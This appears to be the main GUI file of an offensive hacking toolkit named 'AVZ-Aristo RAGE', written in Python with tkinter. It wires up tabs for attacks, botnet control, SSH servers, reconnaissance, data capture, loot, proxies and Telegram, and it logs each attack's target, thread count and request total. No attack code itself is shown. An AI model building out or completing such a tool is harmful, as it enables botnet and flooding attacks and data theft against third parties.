import tkinter as tk
from tkinter import ttk, messagebox
import json, os
from gui.tabs.attack_tab import AttackTab
from gui.tabs.botnet_tab import BotnetTab
from gui.tabs.ssh_tab import SSHTab
from gui.tabs.recon_tab import ReconTab
from gui.tabs.monitor_tab import MonitorTab
from gui.tabs.settings_tab import SettingsTab
from gui.tabs.help_tab import HelpTab
from gui.tabs.exfil_tab import ExfilTab
from gui.tabs.loot_tab import LootTab
from gui.tabs.proxy_tab import ProxyTab
from gui.tabs.telegram_tab import TelegramTab
from gui.tabs.auto_tab import AutoTab
from gui.tabs.diagnostic_tab import DiagnosticTab
from utils.toast import Toast
from engine.proxy import ProxyManager
from utils.logger import Logger
from utils.helpers import load_settings
from utils.clipboard import enable_global_clipboard

# Загружаем версию
VERSION = "unknown"
if os.path.exists("version.json"):
    with open("version.json") as f:
        VERSION = json.load(f).get("version", "unknown")

class App:
    def __init__(self, root):
        self.root = root
        self.root.title(f"AVZ-Aristo v{VERSION} RAGE")
        self.root.geometry("1200x800")
        self.root.configure(bg="#f0f0f0")
        self.theme = 'light'
        self.colors = {
            "bg": "#f0f0f0", "fg": "#000000", "button_bg": "#d9d9d9",
            "entry_bg": "#ffffff", "tree_bg": "#ffffff", "tree_fg": "#000000",
            "tree_sel": "#3399ff"
        }
        self.bg = self.colors["bg"]
        self.fg = self.colors["fg"]
        self.accent = "#3399ff"
        self.success = "#00ff41"
        self.warning = "#ffaa00"
        self.settings = load_settings()
        self.toast = Toast(self.root)
        self.proxy_manager = ProxyManager()
        self.logger = Logger()
        self._create_notebook()
        self.logger.info(f"AVZ-Aristo v{VERSION} GUI запущен")
        enable_global_clipboard(self.root)

    def _create_notebook(self):
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook", background=self.colors["bg"], borderwidth=0)
        style.configure("TNotebook.Tab", background=self.colors["button_bg"],
                        foreground=self.colors["fg"], padding=[10, 2])
        style.map("TNotebook.Tab", background=[("selected", self.colors["tree_sel"])])

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        # Список вкладок (можно расширять динамически)
        self.tabs = {
            "Атака": AttackTab,
            "Ботнет": BotnetTab,
            "SSH-серверы": SSHTab,
            "Разведка": ReconTab,
            "Мониторинг": MonitorTab,
            "Настройки": SettingsTab,
            "Справка": HelpTab,
            "Захват": ExfilTab,
            "Трофеи": LootTab,
            "Прокси": ProxyTab,
            "Telegram": TelegramTab,
            "Автоматизация": AutoTab,
            "Диагностика": DiagnosticTab,
        }

        for title, TabClass in self.tabs.items():
            # Для некоторых вкладок используется свой фрейм
            if title == "Разведка":
                tab = ReconTab(self.notebook, self)
                self.notebook.add(tab.frame, text=title)
            elif title in ("Мониторинг", "Настройки", "Захват", "Трофеи", "Прокси", "Telegram", "Автоматизация"):
                tab = TabClass(self.notebook, self)
                self.notebook.add(tab.frame, text=title)
            else:
                tab = TabClass(self.notebook, self)
                self.notebook.add(tab, text=title)

    def set_status(self, status_type, message):
        self.logger.info(f"Статус [{status_type}]: {message}")

    def show_toast(self, msg):
        self.toast.show(msg)

    def update_monitor(self, rps, total):
        pass

    def save_attack_history(self, target, method, threads, start, end, total):
        self.logger.info(f"Атака завершена: {target} {method} {threads}п => {total} запросов за {end-start:.1f}с")
